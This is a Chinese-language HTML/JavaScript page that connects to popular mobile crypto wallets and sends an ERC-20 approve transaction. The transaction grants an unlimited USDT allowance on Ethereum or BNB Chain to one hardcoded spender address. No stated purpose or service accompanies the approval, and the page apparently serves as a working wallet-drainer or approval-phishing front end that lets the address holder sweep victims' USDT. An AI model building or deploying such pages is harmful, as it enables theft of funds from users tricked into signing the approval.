<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>多钱包 USDT 无限授权</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            width: 100%;
        }
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        .wallet-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        .wallet-item.selected {
            border-color: #667eea;
            background: #f8f9ff;
        }
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }
        .wallet-info {
            flex: 1;
        }
        .wallet-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        .wallet-chains {
            font-size: 12px;
            color: #999;
        }
        .info-box {
            background: #f5f5f5;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 16px;
        }
        .info-label {
            font-size: 12px;
            color: #666;
        }
        .info-value {
            font-size: 12px;
            color: #333;
            word-break: break-all;
            margin-top: 4px;
        }
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        .status.loading { background: #fff3cd; color: #856404; }
        .status.success { background: #d4edda; color: #155724; }
        .status.error { background: #f8d7da; color: #721c24; }
        .hidden { display: none; }
        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .dialog-mask {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .dialog {
            background: white;
            border-radius: 18px;
            padding: 20px;
            max-width: 80%;
            text-align: center;
        }
        .dialog-button {
            margin-top: 16px;
            padding: 8px 24px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 30px;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>🔐 USDT 授权</h1>
        <div class="subtitle">多钱包无限额度授权</div>

        <div class="chain-selector" id="chainSelector">
            <button class="chain-btn active" data-chain="1">Ethereum</button>
            <button class="chain-btn" data-chain="56">BNB Chain</button>
        </div>

        <div class="wallet-list" id="walletList"></div>

        <div class="info-box">
            <div class="info-label">授权地址</div>
            <div class="info-value">0xEe435a366f0c89BE2108f8b02fFDe366158effa1</div>
            <div class="info-label" style="margin-top: 12px;">授权额度</div>
            <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度</div>
        </div>

        <button class="approve-btn" id="approveBtn">授权 USDT</button>
        <div class="status hidden" id="status"></div>
    </div>
</div>

<div id="dialogMask" class="dialog-mask">
    <div class="dialog">
        <div class="dialog-message"></div>
        <button class="dialog-button">确定</button>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
    // ==================== 配置 ====================
    const USDT_ADDRESS = {
        1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        56: '0x55d398326f99059fF775485246999027B3197955'
    };
    const SPENDER_ADDRESS = {
        1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
        56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1'
    };
    const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    // 网络配置
    const NETWORKS = {
        1: {
            chainId: '0x1',
            chainName: 'Ethereum Mainnet',
            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://mainnet.infura.io/v3/'],
            blockExplorerUrls: ['https://etherscan.io']
        },
        56: {
            chainId: '0x38',
            chainName: 'BNB Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com']
        }
    };

    // 钱包配置
    const WALLETS = [
        { key: 'metamask', name: 'MetaMask', icon: '🦊', chains: ['evm'], dappUrl: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, isInjected: () => window.ethereum && window.ethereum.isMetaMask === true },
        { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', chains: ['evm'], dappUrl: (url) => `https://tokenpocket.pro/app/dapp/${url.replace(/^https?:\/\//, '')}`, isInjected: () => window.ethereum && window.ethereum.isTokenPocket === true },
        { key: 'imtoken', name: 'imToken', icon: '🔷', chains: ['evm'], dappUrl: (url) => `https://token.im/dapp?url=${encodeURIComponent(url)}`, isInjected: () => window.ethereum && window.ethereum.isImToken === true },
        { key: 'trust', name: 'Trust Wallet', icon: '🔒', chains: ['evm'], dappUrl: (url) => `https://link.trustwallet.com/dapp/${url.replace(/^https?:\/\//, '')}`, isInjected: () => window.ethereum && window.ethereum.isTrust === true }
    ];

    let currentChain = '1';
    let selectedWallet = null;
    let provider = null;

    // DOM 元素
    const walletListEl = document.getElementById('walletList');
    const statusDiv = document.getElementById('status');
    const dialogMask = document.getElementById('dialogMask');
    const dialogMessage = document.getElementById('dialogMessage');
    const dialogButton = document.querySelector('.dialog-button');

    function showStatus(message, type = 'loading') {
        statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
        statusDiv.className = `status ${type}`;
        statusDiv.classList.remove('hidden');
    }
    function hideStatus() { statusDiv.classList.add('hidden'); }
    function showDialog(msg) {
        dialogMessage.textContent = msg;
        dialogMask.style.display = 'flex';
    }
    function hideDialog() { dialogMask.style.display = 'none'; }
    dialogButton.onclick = hideDialog;
    dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };

    // 渲染钱包列表
    function renderWalletList() {
        walletListEl.innerHTML = WALLETS.map(w => `
            <div class="wallet-item" data-wallet="${w.key}">
                <div class="wallet-icon">${w.icon}</div>
                <div class="wallet-info">
                    <div class="wallet-name">${w.name}</div>
                    <div class="wallet-chains">EVM</div>
                </div>
            </div>
        `).join('');
        document.querySelectorAll('.wallet-item').forEach(item => {
            item.addEventListener('click', () => {
                const key = item.dataset.wallet;
                selectedWallet = key;
                document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                item.classList.add('selected');
                hideStatus();
            });
        });
    }

    // 检测是否在指定钱包的内置浏览器中
    function isInWalletBrowser(walletKey) {
        const wallet = WALLETS.find(w => w.key === walletKey);
        if (!wallet) return false;
        return wallet.isInjected();
    }

    // 切换网络
    async function switchNetwork(targetChainId) {
        const targetHex = '0x' + parseInt(targetChainId).toString(16);
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: targetHex }]
            });
            return true;
        } catch (error) {
            if (error.code === 4902) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [NETWORKS[targetChainId]]
                    });
                    return true;
                } catch (addError) {
                    console.error('添加网络失败:', addError);
                    showStatus('添加网络失败: ' + addError.message, 'error');
                    return false;
                }
            } else {
                console.error('切换网络失败:', error);
                showStatus('切换网络失败: ' + error.message, 'error');
                return false;
            }
        }
    }

    // 在钱包内置浏览器中授权
    async function approveInWallet() {
        if (!window.ethereum) {
            showStatus('未检测到钱包', 'error');
            return false;
        }
        try {
            const targetChainId = parseInt(currentChain);
            // 检查网络
            const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
            const currentChainId = parseInt(currentChainIdHex, 16);
            if (currentChainId !== targetChainId) {
                showStatus(`当前网络不是目标网络，正在切换...`, 'loading');
                const switched = await switchNetwork(targetChainId);
                if (!switched) {
                    showStatus('网络切换失败，请手动切换到目标网络', 'error');
                    return false;
                }
                await new Promise(resolve => setTimeout(resolve, 500));
            }

            // 请求账户
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAddress = accounts[0];
            showStatus(`已连接: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'loading');

            // 构造 approve 交易
            const iface = new ethers.utils.Interface([
                'function approve(address spender, uint256 amount) returns (bool)'
            ]);
            const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS[targetChainId], UNLIMITED_AMOUNT]);
            const transaction = {
                to: USDT_ADDRESS[targetChainId],
                from: userAddress,
                data: data,
                chainId: targetChainId
            };
            console.log('发送交易:', transaction);
            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [transaction]
            });
            showStatus(`✅ 授权成功！交易ID: ${txHash.slice(0,10)}...`, 'success');
            return true;
        } catch (error) {
            console.error(error);
            let errorMsg = error.message || '未知错误';
            if (error.code === 4001) {
                errorMsg = '用户取消了授权';
            } else if (error.code === -32603) {
                errorMsg = '交易失败，可能原因：链未切换、gas 不足或合约地址错误';
            }
            showStatus(`授权失败: ${errorMsg}`, 'error');
            return false;
        }
    }

    // 跳转到钱包内置浏览器
    function jumpToWallet() {
        if (!selectedWallet) {
            showDialog('请先选择钱包');
            return;
        }
        const wallet = WALLETS.find(w => w.key === selectedWallet);
        const currentUrl = window.location.href;
        const dappUrl = wallet.dappUrl(currentUrl);
        // 移动端使用通用链接，PC 使用 scheme 备用
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        let finalUrl = dappUrl;
        if (!isMobile && !dappUrl.startsWith('http')) {
            // PC 端如果链接不是 http，则可能是 scheme，直接使用
            finalUrl = dappUrl;
        }
        window.location.href = finalUrl;
    }

    // 主授权入口
    async function onApprove() {
        if (!selectedWallet) {
            showDialog('请先选择钱包');
            return;
        }

        // 如果已经在当前钱包内置浏览器中，直接授权
        if (isInWalletBrowser(selectedWallet)) {
            await approveInWallet();
            return;
        }

        // 否则跳转到钱包
        showStatus('正在跳转到钱包...', 'loading');
        jumpToWallet();
    }

    // 链切换
    function onChainChange(chainId) {
        currentChain = chainId;
        hideStatus();
    }

    // 初始化
    function init() {
        // 链选择器
        document.querySelectorAll('.chain-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                onChainChange(btn.dataset.chain);
            });
        });
        document.getElementById('approveBtn').addEventListener('click', onApprove);
        renderWalletList();

        // 预检查是否在钱包内置浏览器中
        const detectedWallet = WALLETS.find(w => w.isInjected());
        if (detectedWallet) {
            selectedWallet = detectedWallet.key;
            document.querySelector(`.wallet-item[data-wallet="${detectedWallet.key}"]`).classList.add('selected');
            showStatus(`检测到 ${detectedWallet.name}，可直接授权`, 'success');
            setTimeout(() => hideStatus(), 2000);
        } else {
            showStatus('请选择钱包并授权', 'success');
            setTimeout(() => hideStatus(), 2000);
        }
    }

    init();
</script>
</body>
</html>
